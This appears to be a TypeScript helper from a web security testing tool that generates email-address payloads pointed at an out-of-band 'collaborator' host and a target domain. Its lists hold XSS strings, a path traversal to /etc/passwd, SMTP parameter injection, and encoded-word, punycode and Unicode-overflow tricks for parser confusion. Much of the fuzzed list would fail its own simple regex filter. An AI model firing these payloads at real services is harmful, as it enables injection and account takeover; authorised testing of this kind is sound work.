// Helper functions (b64encode, encodedWord, punycode, unicodeOverflow) remain unchanged

// Simple RFC 5322 email regex for basic validation (can swap for more complete validator)
const rfcEmailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

const isValidEmail = (email: string): boolean => {
  // Basic check against regex, can expand with full RFC validation libs as needed
  // Strip out comments and whitespace before testing as needed
  const cleaned = email.replace(/\s+/g, '').replace(/\(.*?\)/g, '');
  return rfcEmailRegex.test(cleaned);
};

export const generateEmailVariants = (
  collaborator: string, 
  targetDomain: string, 
  includeFuzzed = false
): string[] => {
  const variants: string[] = [];
  const validVariants: string[] = [];
  const fuzzVariants: string[] = [];
  const effectiveTarget = targetDomain || 'example.com';

  // --- Strict RFC-compliant basics & common cases ---
  const strictCases = [
    `user@${collaborator}`,
    `u.ser@${collaborator}`,
    `user+tag@${collaborator}`,
    `user_name@${collaborator}`,
    `user-name@${collaborator}`,
    `"user"@${collaborator}`,
    `"user.name"@${collaborator}`,
    `user@${collaborator}`.toUpperCase(),
    `user@[127.0.0.1]`,
    `user@[IPv6:2001:db8::1]`,
    `user@localhost`,
    `user@${collaborator}.evil.com`,
    `user@subdomain.${collaborator}`
  ];

  // --- Fuzzed and edge case variants ---
  const fuzzedCases = [
    `user@.com`,
    `user@-domain.com`,
    `user@domain-with-dash-.com`,
    `user@domain_with_underscore.com`,
    `user@domain!.com`,
    `user@${collaborator}/`,
    `user@${collaborator}\\`,
    `user@${collaborator}#`,
    `user@${collaborator}?`,
    `user@${collaborator}&`,
    `user@${collaborator}=`,
    `user..test@${collaborator}`,
    `user%2Etest@${collaborator}`,
    `user@${collaborator}/../../etc/passwd`,
    `@${collaborator}`,
    `userexample.com`,
    `" "@${collaborator}`,
    `user@ ${collaborator}`,
    `user @${collaborator}`,
    `user@@${collaborator}`,
    `user@sub@${collaborator}`,
    `user(comment)@${collaborator}`,
    `(foo)user@(bar)${collaborator}`,
    `"@"@${collaborator}`,
    `"\""@${collaborator}`,
    `"user\\@name"@${collaborator}`,
    `"user\\"@${collaborator}"`,
    encodedWord("UTF-8", "B", b64encode("user")) + `@${collaborator}`,
    encodedWord("UTF-8", "Q", "user") + `@${collaborator}`,
    encodedWord("UTF-7", "Q", "user+Example") + `@${collaborator}`,
    encodedWord("UTF-7", "B", b64encode("UserExample")) + `@${collaborator}`,
    encodedWord("x", "q", "=40=3e=00") + `@${collaborator}`,
    encodedWord("x", "b", b64encode("foobar")) + `@${collaborator}`,
    `foo@xn--0049.${collaborator}`,
    `foo@xn--0117.${collaborator}`,
    `x@xn--42.${collaborator}`,
    `x@xn--024.${collaborator}`,
    `x@xn--694.${collaborator}`,
    `x@xn--svg/-9x6.${collaborator}`,
    `x@xn--svg/-f18.${collaborator}`,
    `x@xn--svg/-fq1.${collaborator}`,
    `!#$%&'*+\\/_{|}~-${collaborator}\\@psres.net`,
    `oastify.com!${collaborator}\\@${effectiveTarget}`,
    `collab%psres.net(@${effectiveTarget}`,
    `foo%psres.net@${effectiveTarget}`,
    `foo@psres.net`,
    `"foo\\"@${collaborator}> ORCPT=test;admin"@${effectiveTarget}`,
    `"psres.net!${collaborator}"(\\"@${effectiveTarget}`,
    `collab%psres.net@[127.0.0.1]`,
    `<img src=x onerror=alert(1)>@${collaborator}`,
    `<svg onload=alert(1)>@${collaborator}`,
    `user@${collaborator}<!--css-->`,
    `user@${collaborator}/*css*/`,
    `user@${collaborator}<script>alert(document.domain)</script>`,
    `user@${collaborator}<a href=x onmouseover=alert(1)>`,
    `user@${collaborator}<!--comment-->`,
    `user@${collaborator}%00`,
    `user @ ${collaborator}`,
    `user@ ${collaborator}`,
    `user\t@${collaborator}`,
    `user@${collaborator}\t`,
    `user @ ${collaborator} `,
    `user @\t${collaborator}`,
    `user${collaborator}`,
    `user@.`,
    `@${collaborator}`,
    `user@-`,
    `user@_`,
    encodedWord("utf8", "q", "=61=62=63") + `<${collaborator}>`,
  ];

  // Unicode domains handled separately
  const unicodeDomains = ["exämple", "例子", "пример", "münchen"];
  for (const dom of unicodeDomains) {
    fuzzedCases.push(`user@${dom}.${collaborator}`);
    fuzzedCases.push(`user@${punycode(dom)}.${collaborator}`);
  }

  // Unicode overflow characters
  const overflowChars = ['@', '(', ')', ';', '<', '=', '>', '\x00'];
  for (const ch of overflowChars) {
    for (const u of unicodeOverflow(ch)) {
      fuzzedCases.push(`user${u}${collaborator}`);
    }
  }

  // Collect valid strict cases
  strictCases.forEach(email => {
    if (isValidEmail(email)) {
      validVariants.push(email);
    }
  });

  // Collect valid fuzzed cases if requested
  if (includeFuzzed) {
    fuzzedCases.forEach(email => {
      if (isValidEmail(email)) {
        fuzzVariants.push(email);
      }
    });
  }

  // Return combined sorted list per toggle
  return includeFuzzed
    ? [...new Set([...validVariants, ...fuzzVariants])].sort()
    : [...new Set(validVariants)].sort();
};
